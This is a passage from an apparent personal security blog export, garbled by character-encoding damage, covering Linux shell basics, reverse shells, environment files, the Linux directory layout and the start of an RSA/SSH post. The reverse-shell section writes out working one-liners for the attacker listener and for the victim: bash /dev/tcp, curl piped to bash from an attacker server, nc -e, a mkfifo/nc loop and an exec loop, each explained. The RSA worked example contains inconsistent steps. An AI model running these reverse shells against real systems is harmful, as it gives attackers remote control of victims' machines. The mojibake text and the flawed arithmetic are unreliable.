href="https://blog.csdn.net/flw8840488/article/details/90513873">https://blog.csdn.net/flw8840488/article/details/90513873</a><br><a href="https://blog.csdn.net/lw305080/article/details/52054188">https://blog.csdn.net/lw305080/article/details/52054188</a><br><a href="https://www.runoob.com/linux/linux-system-contents.html">https://www.runoob.com/linux/linux-system-contents.html</a></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>å¦‚ä½•ç†è§£shellï¼Ÿ<br>shellæ˜¯ç”¨æˆ·ä¸Linuxå†…æ ¸ä¹‹é—´çš„ä¸€å±‚â€œä»£ç†â€ï¼Œç”¨æˆ·é€šè¿‡shellä¸Linuxå†…æ ¸å»ºç«‹è”ç³»ã€‚shellæ˜¯åœ¨å†…æ ¸åŸºç¡€ä¸Šç¼–å†™çš„åº”ç”¨ç¨‹åºã€‚<br>å½“ç„¶ï¼Œshellä¹Ÿæ”¯æŒç¼–ç¨‹ï¼Œè¿™é‡Œä¸å±•å¼€è®²è§£ã€‚</p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>å…ˆè¯´æ€ä¹ˆåå¼¹shellï¼Œå†è¯´åå¼¹shellçš„åŸç†ã€‚<br>é¦–å…ˆæ”»å‡»æœºä¸Šæ‰§è¡Œ nc -lvp 8888</p><h3 id="bashåå¼¹"><a href="#bashåå¼¹" class="headerlink" title="bashåå¼¹"></a>bashåå¼¹</h3><p>bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1</p><h3 id="curlåå¼¹"><a href="#curlåå¼¹" class="headerlink" title="curlåå¼¹"></a>curlåå¼¹</h3><p>é¦–å…ˆåœ¨å…¬ç½‘vps å†™å¥½åå¼¹shellçš„è¯­å¥ ä¿å­˜åˆ°ip/bash<br>RCE: curl ip/bash |bash //   |æ˜¯ç®¡é“ç¬¦ï¼Œæ„æ€æ˜¯å°†ä¸Šä¸€ä¸ªçš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªçš„è¾“å…¥</p><h3 id="ncåå¼¹"><a href="#ncåå¼¹" class="headerlink" title="ncåå¼¹"></a>ncåå¼¹</h3><p>å—å®³æœºæ‰§è¡Œ nc -e /bin/sh ip port<br>å¦‚æœncç‰ˆæœ¬ä¸å¯¹çš„è¯å¯ä»¥è¿™æ ·ï¼š<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done</p><h2 id="ç†è§£åå¼¹shell"><a href="#ç†è§£åå¼¹shell" class="headerlink" title="ç†è§£åå¼¹shell"></a>ç†è§£åå¼¹shell</h2><ul><li>ç¬¬ä¸€å¥ï¼šbash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1<br>ç†è§£ï¼šå°†äº¤äº’å¼bashçš„è¾“å‡ºä¸é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°/dev/tcp/ip/port æ–‡ä»¶ï¼Œå¹¶ä¸”å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºã€‚<br>å‰é¢çš„&amp;&gt;ä»£è¡¨å°†è¾“å‡ºä¸é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°åé¢çš„æ–‡ä»¶ï¼Œåé¢çš„0&amp;&gt;1ä»£è¡¨å°†æ ‡å‡†è¾“å…¥ï¼ˆæ–‡ä»¶æ“ä½œç¬¦0ï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼ˆæ–‡ä»¶æ“ä½œç¬¦1ï¼‰ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„&amp;ä»£è¡¨äº†è¯†åˆ«åé¢çš„1ä¸ºæ–‡ä»¶æ“ä½œç¬¦ï¼ˆä»£è¡¨æ ‡å‡†è¾“å‡ºï¼‰ï¼Œè€Œä¸æ˜¯â€œ1â€è¿™ä¸ªæ–‡ä»¶ã€‚<br>Linuxæ“ä½œç³»ç»ŸæŠŠæ‰€æœ‰å†…å®¹éƒ½æŠ½è±¡ä¸ºæ–‡ä»¶ï¼ŒåŒ…æ‹¬tcpè¿æ¥ã€‚<br>ç¤ºæ„å›¾<img src="/img/dev1.jpg"><br>è™šçº¿è¡¨ç¤ºäº†stdin é‡å®šå‘åˆ°stdoutï¼Œç”±äºstdoutå·²ç»é‡å®šå‘åˆ°äº†/dev/tcp/ip/port ï¼Œæ‰€ä»¥stdinä¹Ÿå°†é‡å®šå‘åˆ°/dev/tcp/ip/portã€‚</li><li>ç¬¬äºŒå¥ RCE: curl ip/bash |bash //   |æ˜¯ç®¡é“ç¬¦ï¼Œæ„æ€æ˜¯å°†ä¸Šä¸€ä¸ªçš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªçš„è¾“å…¥<br>é¦–å…ˆåœ¨å…¬ç½‘vpsä¸Šå†™ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹ä¸ºbash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 é‡å‘½åä¸ºbash<br>ç„¶åå†å—å®³æœºä¸Šæ‰§è¡Œcurl ip/bash | bash æ„æ€å°±æ˜¯è¯´é€šè¿‡curlè·å–bashçš„htmlå†…å®¹ï¼Œå¹¶ä¸”ä½œä¸ºä¸‹ä¸€ä¸ªçš„è¾“å…¥ã€‚bashæ˜¯Linuxä¸­çš„shellï¼Œç”¨äºç”¨æˆ·å’Œå†…æ ¸äº¤äº’ã€‚ç›¸å½“äºç”¨æˆ·è¾“å…¥äº†bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1</li><li>ç¬¬ä¸‰å¥ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f<br>ç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªç®¡é“/tmp/f ï¼Œé”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/tmp/f ,æŠŠcat /tmp/fçš„ç»“æœä¼ ç»™äº¤äº’å¼shellæ‰§è¡Œï¼Œä¼ ç»™nc ip portã€‚å½¢æˆç¯è·¯ã€‚<br>å¤§ä½¬è§£è¯»ï¼šmkfifo å‘½ä»¤é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œcat å°†ç®¡é“é‡Œé¢çš„å†…å®¹è¾“å‡ºä¼ é€’ç»™/bin/shï¼Œshä¼šæ‰§è¡Œç®¡é“é‡Œçš„å‘½ä»¤å¹¶å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºç»“æœé€šè¿‡nc ä¼ åˆ°è¯¥ç®¡é“ï¼Œç”±æ­¤å½¢æˆäº†ä¸€ä¸ªå›è·¯<br>æˆ‘çš„è§£è¯»ï¼šå…¶å®ååŠæ®µçš„æ„æ€å°±æ˜¯æŠŠä¼ è¿›æ¥çš„å‘½ä»¤ç”¨/bash/sh æ‰§è¡Œï¼Œç„¶åæŠŠç»“æœä¼ ç»™ip port,ç„¶å ip port å‘é€çš„ç»“æœä¼ ç»™/tmp/f,ç„¶åcat tmp /f,ç„¶åshellæ‰§è¡Œâ€¦.å°±è¿™ä¹ˆå¥—å¨ƒï¼Œäº¤äº’å¼shellå°±æˆäº†ã€‚<h2 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h2>ç¯å¢ƒå˜é‡æ–‡ä»¶ï¼š</li><li>/etc/profile å…¨å±€ç”¨æˆ·ï¼Œåº”ç”¨äºæ‰€æœ‰çš„Shellã€‚</li><li>/$HOME/.profile å½“å‰ç”¨æˆ·ï¼Œåº”ç”¨äºæ‰€æœ‰çš„Shellã€‚</li><li>/etc/bash_bashrc å…¨å±€ç”¨æˆ·ï¼Œåº”ç”¨äºBash Shellã€‚</li><li>~/.bashrc å±€éƒ¨å½“å‰ï¼Œåº”ç”¨äºBash Sellã€‚<br>å†™å…¥/etc/profileæ–‡ä»¶<br>export $PATH:/dir/subdir<br><img src="/img/env1.jpg"><h3 id="ç¯å¢ƒå˜é‡è§£æè¿‡ç¨‹"><a href="#ç¯å¢ƒå˜é‡è§£æè¿‡ç¨‹" class="headerlink" title="ç¯å¢ƒå˜é‡è§£æè¿‡ç¨‹"></a>ç¯å¢ƒå˜é‡è§£æè¿‡ç¨‹</h3><h4 id="ç³»ç»Ÿç¯å¢ƒå˜é‡"><a href="#ç³»ç»Ÿç¯å¢ƒå˜é‡" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒå˜é‡"></a>ç³»ç»Ÿç¯å¢ƒå˜é‡</h4>/etc/profile: æ­¤æ–‡ä»¶ä¸ºç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·è®¾ç½®ç¯å¢ƒä¿¡æ¯,å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•æ—¶,è¯¥æ–‡ä»¶è¢«æ‰§è¡Œ,å¹¶ä»/etc/profile.dç›®å½•çš„é…ç½®æ–‡ä»¶ä¸­æœé›†shellçš„è®¾ç½®.<br>/etc/bashrc: ä¸ºæ¯ä¸€ä¸ªè¿è¡Œbash shellçš„ç”¨æˆ·æ‰§è¡Œæ­¤æ–‡ä»¶.å½“bash shellè¢«æ‰“å¼€æ—¶,è¯¥æ–‡ä»¶è¢«è¯»å–.<h4 id="ç”¨æˆ·ç¯å¢ƒå˜é‡"><a href="#ç”¨æˆ·ç¯å¢ƒå˜é‡" class="headerlink" title="ç”¨æˆ·ç¯å¢ƒå˜é‡"></a>ç”¨æˆ·ç¯å¢ƒå˜é‡</h4>.bash_profile ï¼šå®šä¹‰äº†ç”¨æˆ·çš„ä¸ªäººåŒ–è·¯å¾„ä¸ç¯å¢ƒå˜é‡çš„æ–‡ä»¶åç§°ã€‚æ¯ä¸ªç”¨æˆ·éƒ½å¯ä½¿ç”¨è¯¥æ–‡ä»¶è¾“å…¥ä¸“ç”¨äºè‡ªå·±ä½¿ç”¨çš„shellä¿¡æ¯,å½“ç”¨æˆ·ç™»å½•æ—¶,è¯¥æ–‡ä»¶ä»…ä»…æ‰§è¡Œä¸€æ¬¡ã€‚ï¼ˆåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æœ‰æ‰§è¡Œ.bashrcçš„è„šæœ¬ï¼‰<br>.bashrc ï¼šè¯¥æ–‡ä»¶åŒ…å«ä¸“ç”¨äºä½ çš„shellçš„bashä¿¡æ¯,å½“ç™»å½•æ—¶ä»¥åŠæ¯æ¬¡æ‰“å¼€æ–°çš„shellæ—¶,è¯¥è¯¥æ–‡ä»¶è¢«è¯»å–ã€‚ä¾‹å¦‚ä½ å¯ä»¥å°†ç”¨æˆ·è‡ªå®šä¹‰çš„aliasæˆ–è€…è‡ªå®šä¹‰å˜é‡å†™åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚<br>.bash_history ï¼šè®°å½•å‘½ä»¤å†å²ç”¨çš„ã€‚<br>.bash_logout ï¼šå½“é€€å‡ºshellæ—¶ï¼Œä¼šæ‰§è¡Œè¯¥æ–‡ä»¶ã€‚å¯ä»¥æŠŠä¸€äº›æ¸…ç†çš„å·¥ä½œæ”¾åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚<h3 id="ç”¨æˆ·åˆ‡æ¢ä¸ç¯å¢ƒå˜é‡"><a href="#ç”¨æˆ·åˆ‡æ¢ä¸ç¯å¢ƒå˜é‡" class="headerlink" title="ç”¨æˆ·åˆ‡æ¢ä¸ç¯å¢ƒå˜é‡"></a>ç”¨æˆ·åˆ‡æ¢ä¸ç¯å¢ƒå˜é‡</h3>å¤§éƒ¨åˆ†Linuxå‘è¡Œç‰ˆçš„é»˜è®¤è´¦æˆ·æ˜¯æ™®é€šè´¦æˆ·ï¼Œè€Œæ›´æ”¹ç³»ç»Ÿæ–‡ä»¶æˆ–è€…æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œéœ€è¦rootèº«ä»½æ‰èƒ½è¿›è¡Œï¼Œè¿™å°±éœ€è¦ä»å½“å‰ç”¨æˆ·åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼ŒLinuxä¸­åˆ‡æ¢ç”¨æˆ·çš„å‘½ä»¤æ˜¯suæˆ–su -<br>å‰è€…åªæ˜¯åˆ‡æ¢rootèº«ä»½ï¼Œä½†shellç¯å¢ƒä»ç„¶æ˜¯æ™®é€šç”¨æˆ·çš„shellï¼›<br>è€Œåè€…è¿ç”¨æˆ·å’Œshellç¯å¢ƒä¸€èµ·åˆ‡æ¢æˆrootèº«ä»½äº†ã€‚åªæœ‰åˆ‡æ¢äº†shellç¯å¢ƒæ‰ä¸ä¼šå‡ºç°PATHç¯å¢ƒå˜é‡é”™è¯¯ã€‚suåˆ‡æ¢æˆrootç”¨æˆ·ä»¥åï¼Œpwdä¸€ä¸‹ï¼Œå‘ç°å·¥ä½œç›®å½•ä»ç„¶æ˜¯æ™®é€šç”¨æˆ·çš„å·¥ä½œç›®å½•ï¼›è€Œç”¨su - å‘½ä»¤åˆ‡æ¢ä»¥åï¼Œå·¥ä½œç›®å½•å˜æˆrootå·¥ä½œç›®å½•äº†ã€‚<h2 id="Linuxæ–‡ä»¶ç›®å½•"><a href="#Linuxæ–‡ä»¶ç›®å½•" class="headerlink" title="Linuxæ–‡ä»¶ç›®å½•"></a>Linuxæ–‡ä»¶ç›®å½•</h2><img src="/img/dir1.jpg"></li></ul><p>/binï¼š<br>binæ˜¯Binaryçš„ç¼©å†™, è¿™ä¸ªç›®å½•å­˜æ”¾ç€æœ€ç»å¸¸ä½¿ç”¨çš„å‘½ä»¤ã€‚</p><p>/bootï¼š<br>è¿™é‡Œå­˜æ”¾çš„æ˜¯å¯åŠ¨Linuxæ—¶ä½¿ç”¨çš„ä¸€äº›æ ¸å¿ƒæ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸€äº›è¿æ¥æ–‡ä»¶ä»¥åŠé•œåƒæ–‡ä»¶ã€‚</p><p>/dev ï¼š<br>devæ˜¯Device(è®¾å¤‡)çš„ç¼©å†™, è¯¥ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯Linuxçš„å¤–éƒ¨è®¾å¤‡ï¼Œåœ¨Linuxä¸­è®¿é—®è®¾å¤‡çš„æ–¹å¼å’Œè®¿é—®æ–‡ä»¶çš„æ–¹å¼æ˜¯ç›¸åŒçš„ã€‚</p><p>/etcï¼š<br>è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„é…ç½®æ–‡ä»¶å’Œå­ç›®å½•ã€‚</p><p>/homeï¼š<br>ç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œåœ¨Linuxä¸­ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ç›®å½•ï¼Œä¸€èˆ¬è¯¥ç›®å½•åæ˜¯ä»¥ç”¨æˆ·çš„è´¦å·å‘½åçš„ã€‚</p><p>/libï¼š<br>è¿™ä¸ªç›®å½•é‡Œå­˜æ”¾ç€ç³»ç»Ÿæœ€åŸºæœ¬çš„åŠ¨æ€è¿æ¥å…±äº«åº“ï¼Œå…¶ä½œç”¨ç±»ä¼¼äºWindowsé‡Œçš„DLLæ–‡ä»¶ã€‚å‡ ä¹æ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½éœ€è¦ç”¨åˆ°è¿™äº›å…±äº«åº“ã€‚</p><p>/lost+foundï¼š<br>è¿™ä¸ªç›®å½•ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ç©ºçš„ï¼Œå½“ç³»ç»Ÿéæ³•å…³æœºåï¼Œè¿™é‡Œå°±å­˜æ”¾äº†ä¸€äº›æ–‡ä»¶ã€‚</p><p>/mediaï¼š<br>linuxç³»ç»Ÿä¼šè‡ªåŠ¨è¯†åˆ«ä¸€äº›è®¾å¤‡ï¼Œä¾‹å¦‚Uç›˜ã€å…‰é©±ç­‰ç­‰ï¼Œå½“è¯†åˆ«åï¼Œlinuxä¼šæŠŠè¯†åˆ«çš„è®¾å¤‡æŒ‚è½½åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚</p><p>/mntï¼š<br>ç³»ç»Ÿæä¾›è¯¥ç›®å½•æ˜¯ä¸ºäº†è®©ç”¨æˆ·ä¸´æ—¶æŒ‚è½½åˆ«çš„æ–‡ä»¶ç³»ç»Ÿçš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…‰é©±æŒ‚è½½åœ¨/mnt/ä¸Šï¼Œç„¶åè¿›å…¥è¯¥ç›®å½•å°±å¯ä»¥æŸ¥çœ‹å…‰é©±é‡Œçš„å†…å®¹äº†ã€‚</p><p>/optï¼š<br> è¿™æ˜¯ç»™ä¸»æœºé¢å¤–å®‰è£…è½¯ä»¶æ‰€æ‘†æ”¾çš„ç›®å½•ã€‚æ¯”å¦‚ä½ å®‰è£…ä¸€ä¸ªORACLEæ•°æ®åº“åˆ™å°±å¯ä»¥æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚é»˜è®¤æ˜¯ç©ºçš„ã€‚</p><p>/procï¼š<br>è¿™ä¸ªç›®å½•æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ç›®å½•ï¼Œå®ƒæ˜¯ç³»ç»Ÿå†…å­˜çš„æ˜ å°„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•æ¥è·å–ç³»ç»Ÿä¿¡æ¯ã€‚<br>è¿™ä¸ªç›®å½•çš„å†…å®¹ä¸åœ¨ç¡¬ç›˜ä¸Šè€Œæ˜¯åœ¨å†…å­˜é‡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹é‡Œé¢çš„æŸäº›æ–‡ä»¶ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥å±è”½ä¸»æœºçš„pingå‘½ä»¤ï¼Œä½¿åˆ«äººæ— æ³•pingä½ çš„æœºå™¨ï¼š</p><p>/rootï¼š<br>è¯¥ç›®å½•ä¸ºç³»ç»Ÿç®¡ç†å‘˜ï¼Œä¹Ÿç§°ä½œè¶…çº§æƒé™è€…çš„ç”¨æˆ·ä¸»ç›®å½•ã€‚</p><p>/sbinï¼š<br>så°±æ˜¯Super Userçš„æ„æ€ï¼Œè¿™é‡Œå­˜æ”¾çš„æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„ç³»ç»Ÿç®¡ç†ç¨‹åºã€‚</p><p>/selinuxï¼š<br> è¿™ä¸ªç›®å½•æ˜¯Redhat/CentOSæ‰€ç‰¹æœ‰çš„ç›®å½•ï¼ŒSelinuxæ˜¯ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œç±»ä¼¼äºwindowsçš„é˜²ç«å¢™ï¼Œä½†æ˜¯è¿™å¥—æœºåˆ¶æ¯”è¾ƒå¤æ‚ï¼Œè¿™ä¸ªç›®å½•å°±æ˜¯å­˜æ”¾selinuxç›¸å…³çš„æ–‡ä»¶çš„ã€‚</p><p>/srvï¼š<br> è¯¥ç›®å½•å­˜æ”¾ä¸€äº›æœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦æå–çš„æ•°æ®ã€‚</p><p>/sysï¼š</p><p> è¿™æ˜¯linux2.6å†…æ ¸çš„ä¸€ä¸ªå¾ˆå¤§çš„å˜åŒ–ã€‚è¯¥ç›®å½•ä¸‹å®‰è£…äº†2.6å†…æ ¸ä¸­æ–°å‡ºç°çš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ sysfs ã€‚</p><p>sysfsæ–‡ä»¶ç³»ç»Ÿé›†æˆäº†ä¸‹é¢3ç§æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ï¼šé’ˆå¯¹è¿›ç¨‹ä¿¡æ¯çš„procæ–‡ä»¶ç³»ç»Ÿã€é’ˆå¯¹è®¾å¤‡çš„devfsæ–‡ä»¶ç³»ç»Ÿä»¥åŠé’ˆå¯¹ä¼ªç»ˆç«¯çš„devptsæ–‡ä»¶ç³»ç»Ÿã€‚<br>è¯¥æ–‡ä»¶ç³»ç»Ÿæ˜¯å†…æ ¸è®¾å¤‡æ ‘çš„ä¸€ä¸ªç›´è§‚åæ˜ ã€‚</p><p>å½“ä¸€ä¸ªå†…æ ¸å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œå¯¹åº”çš„æ–‡ä»¶å’Œç›®å½•ä¹Ÿåœ¨å†…æ ¸å¯¹è±¡å­ç³»ç»Ÿä¸­è¢«åˆ›å»ºã€‚</p><p>/tmpï¼š<br>è¿™ä¸ªç›®å½•æ˜¯ç”¨æ¥å­˜æ”¾ä¸€äº›ä¸´æ—¶æ–‡ä»¶çš„ã€‚</p><p>/usrï¼š<br> è¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç›®å½•ï¼Œç”¨æˆ·çš„å¾ˆå¤šåº”ç”¨ç¨‹åºå’Œæ–‡ä»¶éƒ½æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œç±»ä¼¼äºwindowsä¸‹çš„program filesç›®å½•ã€‚</p><p>/usr/binï¼š<br>ç³»ç»Ÿç”¨æˆ·ä½¿ç”¨çš„åº”ç”¨ç¨‹åºã€‚</p><p>/usr/sbinï¼š<br>è¶…çº§ç”¨æˆ·ä½¿ç”¨çš„æ¯”è¾ƒé«˜çº§çš„ç®¡ç†ç¨‹åºå’Œç³»ç»Ÿå®ˆæŠ¤ç¨‹åºã€‚</p><p>/usr/srcï¼š<br>å†…æ ¸æºä»£ç é»˜è®¤çš„æ”¾ç½®ç›®å½•ã€‚</p><p>/varï¼š<br>è¿™ä¸ªç›®å½•ä¸­å­˜æ”¾ç€åœ¨ä¸æ–­æ‰©å……ç€çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬ä¹ æƒ¯å°†é‚£äº›ç»å¸¸è¢«ä¿®æ”¹çš„ç›®å½•æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚åŒ…æ‹¬å„ç§æ—¥å¿—æ–‡ä»¶ã€‚</p><p>/runï¼š<br>æ˜¯ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿï¼Œå­˜å‚¨ç³»ç»Ÿå¯åŠ¨ä»¥æ¥çš„ä¿¡æ¯ã€‚å½“ç³»ç»Ÿé‡å¯æ—¶ï¼Œè¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶åº”è¯¥è¢«åˆ æ‰æˆ–æ¸…é™¤ã€‚å¦‚æœä½ çš„ç³»ç»Ÿä¸Šæœ‰ /var/run ç›®å½•ï¼Œåº”è¯¥è®©å®ƒæŒ‡å‘ run</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA Encryption</title>
      <link href="2020/03/27/RSA-AES-Encryption/"/>
      <url>2020/03/27/RSA-AES-Encryption/</url>
      
        <content type="html"><![CDATA[<h1 id="è‡´æ•¬ã€å‚è€ƒ"><a href="#è‡´æ•¬ã€å‚è€ƒ" class="headerlink" title="è‡´æ•¬ã€å‚è€ƒ"></a>è‡´æ•¬ã€å‚è€ƒ</h1><p><a href="https://blog.csdn.net/dbs1215/article/details/48953589">https://blog.csdn.net/dbs1215/article/details/48953589</a><br><a href="https://www.jianshu.com/p/0f9b72d691c2">https://www.jianshu.com/p/0f9b72d691c2</a><br><a href="https://blog.csdn.net/weixin_37490221/article/details/80823129">https://blog.csdn.net/weixin_37490221/article/details/80823129</a></p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><h3 id="RSAåŸºæœ¬æ¦‚å¿µ"><a href="#RSAåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="RSAåŸºæœ¬æ¦‚å¿µ"></a>RSAåŸºæœ¬æ¦‚å¿µ</h3><p>RSAæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚<br>å½“æ—¶å­¦è®¡ç®—æœºç½‘ç»œçš„æ—¶å€™å¯¹å¯¹ç§°ã€éå¯¹ç§°çš„æ¦‚å¿µå¾ˆæ¨¡ç³Šï¼Œæ€»æ˜¯è®°ä¸æ¸…ã€‚å‰ä¸¤å¤©SSHç™»å½•å°è¯•äº†RSAå…å¯†ç™»å½•ï¼Œç»“åˆä¹‹å‰é—®è¿‡çš„è€å¸ˆçš„ç›¸å…³å†…å®¹ï¼Œå¯¹RSAçš„æ•´ä¸ªè¿‡ç¨‹æœ‰äº†ä¸€ä¸ªå¤§è‡´çš„äº†è§£ã€‚<br>ç§é’¥ä¸€å®šåªæœ‰è‡ªå·±çŸ¥é“æ‰èƒ½ä¿è¯å®‰å…¨ï¼ï¼<br>å¯†æ–‡=(æ˜æ–‡<sup>E</sup>)mod N<br>æ˜æ–‡=(å¯†æ–‡<sup>D</sup>)mod N<br>ç¬¦å·è¯´æ˜ï¼š<br>Nï¼šç”±ä¸¤ä¸ªè´¨æ•°p<em>qæ„æˆã€‚<br>Lï¼š1&lt;L&lt;lcm(p-1,q-1) (p-1,q-1çš„æœ€å°å…¬å€æ•°)<br>Eï¼š1&lt;E&lt;L &amp;&amp; gcd(E,L)=1<br>D: 1&lt;D&lt;L &amp;&amp; E</em>D mod L=1 (è¿™ä¹Ÿå°è¯äº†å¯¹Eçš„å®šä¹‰ä¸­ä¸ºä»€ä¹ˆEå’ŒLè¦äº’è´¨)</p><h4 id="å®ç°è¿‡ç¨‹"><a href="#å®ç°è¿‡ç¨‹" class="headerlink" title="å®ç°è¿‡ç¨‹"></a>å®ç°è¿‡ç¨‹</h4><p>å–p=17,q=19,åˆ™N=323<br>åˆ™L=lcm(16,18)=144<br>âˆµ1&lt;E&lt;L &amp;&amp; gcd(E,L)=1<br>âˆ´ E=5<br>ç”±1&lt;D&lt;L &amp;&amp; E<em>D mod L=1å¯å¾—ï¼š7*D MOD 144 =1 -&gt; 5</em>D=145<em>n(nâˆˆN</em>)ï¼ˆè¿™é‡Œçš„N*ä»£è¡¨æ­£æ•´æ•°ï¼‰<br>å¯å¾—D=29<br>åˆ™ï¼šå…¬é’¥å¯¹(E,N)=(5,323)<br>ç§é’¥å¯¹(D,N)=(29,323)<br>è®¾åŸå§‹æ¶ˆæ¯M=233ï¼Œç»ç§é’¥åŠ å¯†åçš„å¯†æ–‡=æ˜æ–‡<sup>E</sup> mod N=275<br>è§£å¯†è¿‡ç¨‹ä¸­ï¼Œæ˜æ–‡=å¯†æ–‡<sup>D</sup> mod N=233ï¼Œè¿˜åŸæˆåŠŸã€‚</p><h3 id="RSAå·¥ä½œè¿‡ç¨‹"><a href="#RSAå·¥ä½œè¿‡ç¨‹" class="headerlink" title="RSAå·¥ä½œè¿‡ç¨‹"></a>RSAå·¥ä½œè¿‡ç¨‹</h3><p>åŸå§‹éœ€è¦å‘é€çš„æ¶ˆæ¯ä¸ºm<br>å…¬é’¥åŠ å¯†æ–¹æ³•ä¸ºpubencode()<br>å…¬é’¥è§£å¯†æ–¹æ³•ä¸ºpubdecode()<br>å…¬é’¥åŠ å¯†/è§£å¯†å¾—åˆ°çš„å†…å®¹ä¸ºpub(m)<br>ç§é’¥åŠ å¯†æ–¹æ³•ä¸ºpriencode()<br>ç§é’¥è§£å¯†æ–¹æ³•ä¸ºpridecode()<br>ç§é’¥åŠ å¯†/è§£å¯†å¾—åˆ°çš„å†…å®¹ä¸ºpri(m)<br>Clientâ€”â€”â€”â€”â€”â€”â€”â€”â€“transmitting â€”â€”â€”â€”Server<br>M1-&gt;priencode()-&gt;pri(M1)-&gt; â€¦â€¦â€¦â€¦..    pri(M1)-&gt;pubdecode()-&gt;M1<br>M2&lt;-pridecode()&lt;-pub(M2)&lt;- â€¦â€¦â€¦â€¦..    pub(M2)&lt;-pubencode()&lt;-M2</p><h3 id="SSHå…å¯†ç™»é™†"><a href="#SSHå…å¯†ç™»é™†" class="headerlink" title="SSHå…å¯†ç™»é™†"></a>SSHå…å¯†ç™»é™†</h3><h4 id="åŸºäºå£ä»¤çš„éªŒè¯"><a href="#åŸºäºå£ä»¤çš„éªŒè¯" class="headerlink" title="åŸºäºå£ä»¤çš„éªŒè¯"></a>åŸºäºå£ä»¤çš„éªŒè¯</h4><p><img src="/img/ssh.png"></p><h4 id="åŸºäºå¯†é’¥çš„éªŒè¯"><a href="#åŸºäºå¯†é’¥çš„éªŒè¯" class="headerlink" title="åŸºäºå¯†é’¥çš„éªŒè¯"></a>åŸºäºå¯†é’¥çš„éªŒè¯</h4><p>ä½¿ç”¨RSAçš„å…¬é’¥ã€ç§é’¥æœºåˆ¶å¯ä»¥å®ç°sshå…å¯†ç™»å½•ã€‚<br><img 